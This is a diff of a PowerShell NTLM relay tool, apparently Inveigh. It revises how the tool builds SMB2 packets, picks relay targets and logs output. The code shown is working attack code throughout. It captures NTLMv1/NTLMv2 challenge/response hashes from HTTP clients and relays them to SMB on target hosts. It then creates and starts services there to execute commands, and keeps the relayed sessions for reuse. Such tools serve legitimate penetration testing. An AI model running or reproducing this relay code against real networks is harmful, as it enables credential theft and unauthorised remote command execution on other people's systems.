+                                $inveigh.relay_list.Add("0 $HTTP_source_IP $HTTP_username_full $Target") > $null
                             }
 
-                            $inveigh.output_queue.Add("[!] $(Get-Date -format s) $HTTP_username_full does not have required privilege on $Target") > $null
+                            $inveigh.output_queue.Add("[!] $(Get-Date -format s) $HTTP_username_full does not have command execution privilege on $Target") > $null
                             $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                             $SMB_close_service_handle_stage = 2
-                            $SMB2_message_ID += 19
+                            $SMB2_message_ID++
                             $SMB_client_stage = 'CloseServiceHandle'
                         }
                         else
@@ -2436,8 +2480,8 @@ $SMB_relay_functions_scriptblock =
             
                     'CreateServiceW'
                     {
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
@@ -2457,13 +2501,13 @@ $SMB_relay_functions_scriptblock =
                     'CreateServiceW_First'
                     {
                         $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
-                        $SMB2_message_ID += 20
+                        $SMB2_message_ID++
                         $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                         $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                         $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                         $SMB_split_index_tracker = $SMB_split_index
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
@@ -2496,7 +2540,7 @@ $SMB_relay_functions_scriptblock =
                         $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                         $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
@@ -2525,7 +2569,7 @@ $SMB_relay_functions_scriptblock =
                         $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                         $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
@@ -2548,8 +2592,8 @@ $SMB_relay_functions_scriptblock =
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service created on $Target") > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute command on $Target") > $null
                             $SMB_service_context_handle = $SMB_client_receive[112..131]
-                            $SMB2_message_ID += 20
-                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                            $SMB2_message_ID++
+                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                             $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
@@ -2569,7 +2613,7 @@ $SMB_relay_functions_scriptblock =
                         }
                         elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')
                         {
-                            $inveigh.console_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service creation failed on $Target") > $null
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service creation failed on $Target") > $null
                             $SMB_relay_failed = $true
                         }
                         else
@@ -2591,8 +2635,8 @@ $SMB_relay_functions_scriptblock =
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service failed to start on $Target") > $null
                         }
 
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
@@ -2618,7 +2662,7 @@ $SMB_relay_functions_scriptblock =
                         if($SMB_close_service_handle_stage -eq 1)
                         {
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service deleted on $Target") > $null
-                            $SMB2_message_ID += 20
+                            $SMB2_message_ID++
                             $SMB_close_service_handle_stage++
                             $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                         }
@@ -2629,7 +2673,7 @@ $SMB_relay_functions_scriptblock =
                             $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                         }
 
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
@@ -2647,8 +2691,8 @@ $SMB_relay_functions_scriptblock =
 
                     'CloseRequest'
                     {
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -2663,8 +2707,8 @@ $SMB_relay_functions_scriptblock =
 
                     'TreeDisconnect'
                     {
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -2689,8 +2733,8 @@ $SMB_relay_functions_scriptblock =
 
                     'Logoff'
                     {
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -2818,6 +2862,7 @@ $HTTP_scriptblock =
     $HTTP_running = $true
     $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
     $HTTP_client_close = $true
+    $process_ID_bytes = Get-ProcessIDArray
     $relay_step = 0
 
     if($proxy_listener)
@@ -2933,7 +2978,7 @@ $HTTP_scriptblock =
 
             while($HTTP_stream.DataAvailable)
             {
-                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
+                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
             }
 
             $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
@@ -2964,13 +3009,13 @@ $HTTP_scriptblock =
 
             if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
             {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent")
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
 
                 if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
                 }
 
             }
@@ -3024,28 +3069,12 @@ $HTTP_scriptblock =
                 if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                 {
                     
-                    if($attack -eq 'Session')
+                    if($inveigh.target_list -gt 1)
                     {
-                        $target = $null
 
-                        ForEach($target_entry in $inveigh.target_list)
+                        if($attack -eq 'Session')
                         {
-
-                            if(!$target)
-                            {
-                                
-                                if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Initiator -eq $HTTP_source_IP -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
-                                {
-                                    $target = $target_entry
-                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target")
-                                }
-
-                            }
-
-                        }
-
-                        if(!$target -and $SessionPriority -eq 'Y')
-                        {
+                            $target = $null
 
                             ForEach($target_entry in $inveigh.target_list)
                             {
@@ -3053,10 +3082,31 @@ $HTTP_scriptblock =
                                 if(!$target)
                                 {
                                     
-                                    if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Privileged -eq 'yes' -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
+                                    if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Initiator -eq $HTTP_source_IP -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
                                     {
                                         $target = $target_entry
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target")
+                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
+                                    }
+
+                                }
+
+                            }
+
+                            if(!$target -and $SessionPriority -eq 'Y')
+                            {
+
+                                ForEach($target_entry in $inveigh.target_list)
+                                {
+
+                                    if(!$target)
+                                    {
+                                        
+                                        if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Privileged -eq 'yes' -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
+                                        {
+                                            $target = $target_entry
+                                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
+                                        }
+
                                     }
 
                                 }
@@ -3064,39 +3114,43 @@ $HTTP_scriptblock =
                             }
 
                         }
-
-                    }
-                    else
-                    {
-                        $target = $null
-
-                        ForEach($target_entry in $inveigh.target_list)
+                        else
                         {
+                            $target = $null
 
-                            if(!$target)
+                            ForEach($target_entry in $inveigh.target_list)
                             {
 
-                                if($HTTP_source_IP -ne $target_entry -and !$inveigh.relay_list.Contains("$HTTP_source_IP $target_entry"))
+                                if(!$target)
                                 {
-                                    $target = $target_entry   
+
+                                    if($HTTP_source_IP -ne $target_entry -and !$inveigh.relay_list.Contains("$HTTP_source_IP $target_entry"))
+                                    {
+                                        $target = $target_entry   
+                                    }
+
                                 }
 
                             }
 
+                            if(!$target)
+                            {
+                                $target = $inveigh.target_list[(Get-Random -Maximum $inveigh.target_list.Count)]
+                            }
+
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
                         }
 
-                        if(!$target)
-                        {
-                            $target = $inveigh.target_list[(Get-Random -Maximum $inveigh.target_list.Count)]
-                        }
-
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target")
+                    }
+                    else
+                    {
+                      $target = $inveigh.target_list[0] 
                     }
                     
                     if($inveigh.SMB_relay -and $relay_step -eq 0 -and ($target -and $HTTP_source_IP -ne $target))
                     {
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay initiated by $HTTP_source_IP")
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target")
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay initiated by $HTTP_source_IP") > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
                         $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                         $SMB_relay_socket.Client.ReceiveTimeout = 60000
                         $SMB_relay_socket.Connect($Target,"445")
@@ -3105,13 +3159,13 @@ $HTTP_scriptblock =
                     
                         if(!$SMB_relay_socket.connected)
                         {
-                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target is not responding")
+                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target is not responding") > $null
                             $relay_step = 0
                         }
 
                         if($relay_step -eq 1)
                         {
-                            $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes $SMB_version
+                            $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes $SMB_version $process_ID_bytes
 
                             if($SMB_relay_bytes.Length -le 3)
                             {
@@ -3155,9 +3209,9 @@ $HTTP_scriptblock =
                             $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                             $NTLM = 'NTLM ' + $NTLM_challenge_base64
                             $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
-                            $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge)
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target")
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP")
+                            $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge) > $null
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
                             $relay_step = 2
                         }
                         else
@@ -3171,11 +3225,11 @@ $HTTP_scriptblock =
 
                         if(!$target)
                         {
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted due to lack of an eligible target")
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted due to lack of an eligible target") > $null
                         }
                         elseif($HTTP_source_IP -ne $Target)
                         {
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted relay due to initiator matching $target")
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted relay due to initiator matching $target") > $null
                         }
 
                         $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
@@ -3194,7 +3248,7 @@ $HTTP_scriptblock =
                        
                     if($HTTP_NTLM_domain_length -eq 0)
                     {
-                        $HTTP_NTLM_domain_string = ''
+                        $HTTP_NTLM_domain_string = ""
                     }
                     else
                     {  
@@ -3204,13 +3258,13 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                     $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                     
-                    if($HTTP_NTLM_user_length -gt 0)
+                    if($HTTP_NTLM_user_length -eq 0)
                     {    
-                        $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
+                        $HTTP_NTLM_user_string = ""
                     }
                     else
                     {
-                        $HTTP_NTLM_user_string = ""
+                        $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                     }
 
                     $HTTP_username_full = $HTTP_NTLM_domain_string + "\" + $HTTP_NTLM_user_string
@@ -3227,21 +3281,21 @@ $HTTP_scriptblock =
 
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                         {     
-                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash)
+                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash) > $null
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full - not unique")
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash)
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response written to " + $inveigh.NTLMv1_out_file)
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
                             }
 
                             if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
@@ -3261,26 +3315,26 @@ $HTTP_scriptblock =
                         
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                         {
-                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash)
+                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash) > $null
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full - not unique")
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
-                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash)
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
+                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
                             }
 
                             if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                             {
-                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full")
+                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                             }
                         
                         }
@@ -3306,8 +3360,8 @@ $HTTP_scriptblock =
 
                                     if(($inveigh.session_list | Where-Object {$_.User -eq $HTTP_username_full -and $_.Target -eq $target -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
                                     {
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target")
-                                        $SMB_relay_failed = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID
+                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
+                                        $SMB_relay_failed = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                         
                                         if(!$SMB_relay_failed)
                                         {
@@ -3318,7 +3372,7 @@ $HTTP_scriptblock =
                                                 $inveigh.session_table[$inveigh.session_count] = $SMB_session_ID
                                                 $inveigh.session_message_ID_table[$inveigh.session_count] = 3
                                                 $inveigh.session_lock_table[$inveigh.session_count] = 'open'
-                                                $session_privilege = SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID
+                                                $session_privilege = SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                                 $session_object = New-Object PSObject
                                                 Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count
                                                 Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString
@@ -3347,12 +3401,12 @@ $HTTP_scriptblock =
                                                 Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Established" $(Get-Date -format s)
                                                 Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $(Get-Date -format s)
                                                 $inveigh.session_list += $session_object
-                                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sesion $($inveigh.session_count) added to session list")
+                                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sesion $($inveigh.session_count) added to session list") > $null
                                                 $inveigh.session_count++
                                             }
                                             else
                                             {
-                                                SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID
+                                                SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                             }
 
                                         }
@@ -3362,7 +3416,7 @@ $HTTP_scriptblock =
                                     }
                                     else
                                     {
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has reached session limit on $Target")
+                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has reached session limit on $Target") > $null
                                         $SMB_relay_socket.Close()
                                         $relay_step = 0
                                     }
@@ -3370,7 +3424,7 @@ $HTTP_scriptblock =
                                 }
                                 else
                                 {
-                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has already been tried on $Target")
+                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has already been tried on $Target") > $null
                                     $SMB_relay_socket.Close()
                                     $relay_step = 0
                                 }
@@ -3378,7 +3432,7 @@ $HTTP_scriptblock =
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Aborting relay since $HTTP_NTLM_user_string appears to be a machine account") > $null
                                 $SMB_relay_socket.Close()
                                 $relay_step = 0
                             }
@@ -3386,7 +3440,7 @@ $HTTP_scriptblock =
                         }
                         else
                         {
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list")
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list") > $null
                             $SMB_relay_socket.Close()
                             $relay_step = 0
                         }
@@ -3506,6 +3560,7 @@ $control_relay_scriptblock =
 
     function SigningCheck
     {
+        $process_ID_bytes = Get-ProcessIDArray
         $target_list = $inveigh.target_list
 
         ForEach($target_entry in $target_list)
@@ -3520,7 +3575,7 @@ $control_relay_scriptblock =
             }
             else
             {
-                SMBRelayChallenge $SMB_relay_socket $null '$SMB1' $true > $null
+                SMBRelayChallenge $SMB_relay_socket $null '$SMB1' $true $process_ID_bytes > $null
             }
 
         }
@@ -3535,13 +3590,9 @@ $control_relay_scriptblock =
     function OutputQueueLoop
     {
 
-        while($inveigh.output_queue.Count -gt 0)
+        while($inveigh.output_queue.Count -gt 0 -and $inveigh.output_pause)
         {
-            
-            if($inveigh.console_output)
-            {
-                $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
-            }
+            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
 
             if($inveigh.file_output)
             {
@@ -3649,27 +3700,6 @@ $control_relay_scriptblock =
        
     while($inveigh.relay_running)
     {
-        
-        while($inveigh.output_queue.Count -gt 0)
-        {
-            
-            if($inveigh.console_output)
-            {
-                $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
-            }
-
-            if($inveigh.file_output)
-            {
-                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
-            }
-
-            if($inveigh.log_output)
-            {
